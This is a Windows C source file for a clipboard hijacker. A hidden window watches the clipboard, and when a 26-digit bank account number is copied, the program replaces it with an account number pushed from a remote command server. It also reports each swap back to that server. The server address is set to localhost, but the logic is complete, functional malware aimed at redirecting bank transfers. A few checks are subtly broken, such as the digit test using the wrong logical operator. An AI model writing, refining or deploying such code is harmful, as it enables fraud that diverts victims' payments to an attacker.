#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#include <winsock2.h>
#include <stdio.h>
#include <stdbool.h>
#include <string.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

#define LOADINGSTEPS 4

const char CLASS_NAME[] = "ClipboardListenerConsoleWindow";
typedef enum {
    PING_MSG,
    STATUS_MSG,
    RECIVED_MSG,
    NOP,
    REPLACE_CARD_NUMBER,
    SCREENSHOT
}MsgType;

// Hidden window vars

HANDLE	windowThreadHandle;
DWORD	windowThreadId;


// Connection vars
WSADATA wsadata;
SOCKET serverSocket;
struct sockaddr_in serverAddr;
int result;

//Action vars
#define CARDNUMBER_SIZE 512
char cardNumber[CARDNUMBER_SIZE] = "";
bool clipboardSwapped = false;

void startClient() {
    int loadingStep = 0;
    const char loadingIcon[LOADINGSTEPS] = { '-','\\','|','/' };

    result = WSAStartup(MAKEWORD(2, 2), &wsadata);
    if (result != 0) {
        printf("WSAStartup failed: %d\n", result);
        return;
    }

    serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSocket == INVALID_SOCKET) {
        printf("Socket creation failed: %d\n", WSAGetLastError());
        WSACleanup();
        return;
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(12345);
    serverAddr.sin_addr.s_addr = inet_addr("127.0.0.1"); // localhost

    while (connect(serverSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        system("cls");
        printf("Trying to connect to server %c\n", loadingIcon[loadingStep]);

        loadingStep++;
        if (loadingStep == LOADINGSTEPS) {
            loadingStep = 0;
        }
    }

    printf("Connected to server!\n");
}

void communicateWithServer() {
    MsgType recivedMsgType;
    MsgType sentMsgType;

    bool    running = true;
    char    buffer[512];

    int     recivedBytes;
    int     option = 0;



    while (running) {
        if (clipboardSwapped) {
            const char info[] = "Clipboard was swapped!";
            sentMsgType = STATUS_MSG;

            send(serverSocket, &sentMsgType, sizeof(MsgType), NULL);

            recivedBytes = recv(serverSocket, &recivedMsgType, sizeof(MsgType), NULL);

            if (recivedMsgType != RECIVED_MSG)printf("Couldnt recive message\n");

            send(serverSocket, info, strlen(info) + 1, NULL);

            clipboardSwapped = false;

        }
        else {
            sentMsgType = PING_MSG;

            send(serverSocket, &sentMsgType, sizeof(MsgType), NULL);
        }

        recivedBytes = recv(serverSocket, &recivedMsgType, sizeof(MsgType), NULL);
        if (recivedMsgType == REPLACE_CARD_NUMBER) {
            sentMsgType = RECIVED_MSG;

            send(serverSocket, &sentMsgType, sizeof(MsgType), NULL);

            recivedBytes = recv(serverSocket, &cardNumber, CARDNUMBER_SIZE, NULL);

            printf("Changed acccount num to %s\n", cardNumber);
        }
        else if (recivedMsgType == PING_MSG) {

        }

    }

    printf("Server stopped respodning\n");
}


void stopClient() {
    closesocket(serverSocket);
    WSACleanup();
    printf("Client stopped.\n");
}

void getClipboardContents(char** clipboardContents, size_t* length) {
    if (!OpenClipboard(NULL)) {
        printf("Failed to open clipboard!\n");
        *clipboardContents = NULL;
        *length = 0;
        return;
    }

    HANDLE hData = GetClipboardData(CF_TEXT);
    if (hData == NULL) {
        printf("No text data in clipboard!\n");
        *clipboardContents = NULL;
        *length = 0;
        CloseClipboard();
        return;
    }

    char* data = (char*)GlobalLock(hData);
    if (data == NULL) {
        printf("Failed to lock memory!\n");
        *clipboardContents = NULL;
        *length = 0;
        CloseClipboard();
        return;
    }

    *length = strlen(data);  // d³ugoœæ w bajtach (bez null-terminatora)
    *clipboardContents = data;

    GlobalUnlock(hData);
    CloseClipboard();
}


void changeClipboardContent(const char* textToCopy) {
    if (!OpenClipboard(NULL)) {
        return; 
    }

    if (!EmptyClipboard()) {
        printf("Failed to empty clipboard!\n");
        CloseClipboard();
        return; 
    }

    size_t len = strlen(textToCopy) + 1; 
    HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, len);
    if (hMem == NULL) {
        printf("Failed to allocate memory!\n");
        CloseClipboard();
        return; 
    }


    char* pMem = (char*)GlobalLock(hMem);
    if (pMem == NULL) {
        printf("Failed to lock memory!\n");
        GlobalFree(hMem);
        CloseClipboard();
        return; 
    }

    memcpy(pMem, textToCopy, len);
    GlobalUnlock(hMem);

    if (SetClipboardData(CF_TEXT, hMem) == NULL) {
        printf("Failed to set clipboard data.\n");
        GlobalFree(hMem);
        CloseClipboard();
        return; 
    }

    CloseClipboard();
}

void deleteSpaces(char* str) {
    char* temp_str = malloc(sizeof(char) * (strlen(str)+1));
    memset(temp_str, '\0', strlen(str) + 1);
    int j = 0;
    for (int i = 0; str[i] != '\0'; i++) {
        if (str[i] != ' ') {
            temp_str[j] = str[i];
            j++;
        }
    }
    strcpy(str, temp_str);

    free(temp_str);
}

bool checkIfOnlyNumbers(char* str) {
    for (int i = 0; str[i] != '\0'; i++) {
        if (str[i] < '0' && '9' < str[i]) {
            return false;
        }
    }

    return true;
}

bool checkIfCardNumber(char* str) {
    size_t strLenght;

    deleteSpaces(str);
    printf("%s\n", str);

    strLenght = strlen(str);

    if (strLenght != 26) {
        return false;
    }

    if (!checkIfOnlyNumbers(str)) {
        return false;
    }

    return true;
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
    case WM_CREATE:
        AddClipboardFormatListener(hwnd);
        break;

    case WM_CLIPBOARDUPDATE:{
        size_t clipboardContentSize;
        char* clipboardContents;
        

        getClipboardContents(&clipboardContents,&clipboardContentSize);

        if (clipboardContentSize < 20 || clipboardContentSize > 400) {
            break;
        }
        
        if (checkIfCardNumber(clipboardContents)){
            clipboardSwapped = true;
            changeClipboardContent(cardNumber);

            printf("cliboard updated");
        }


        break;
    }
    case WM_DESTROY:
        RemoveClipboardFormatListener(hwnd);
        PostQuitMessage(0);
        break;
    }
    return DefWindowProc(hwnd, msg, wParam, lParam);
}

void createHiddenWindow(void* nothing) {
    HINSTANCE hInstance = GetModuleHandle(NULL);

    WNDCLASS wc = { 0 };
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;

    if (!RegisterClass(&wc)) {
        fprintf(stderr, "Nie mo¿na zarejestrowaæ klasy okna\n");
        return 1;
    }

    HWND hwnd = CreateWindowEx(
        0, CLASS_NAME, "Clipboard Listener",
        WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT,
        CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, hInstance, NULL);

    if (!hwnd) {
        fprintf(stderr, "Nie mo¿na utworzyæ okna\n");
        return 1;
    }

    // Ukrywamy okno (bo to konsolówka)
    ShowWindow(hwnd, SW_HIDE);

    // Pêtla komunikatów
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}


int main() {

    printf("essa\n");

    windowThreadHandle = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)createHiddenWindow,
        NULL,
        0,
        &windowThreadId
    );

    startClient();

    communicateWithServer();

    stopClient();

    return 0;
}
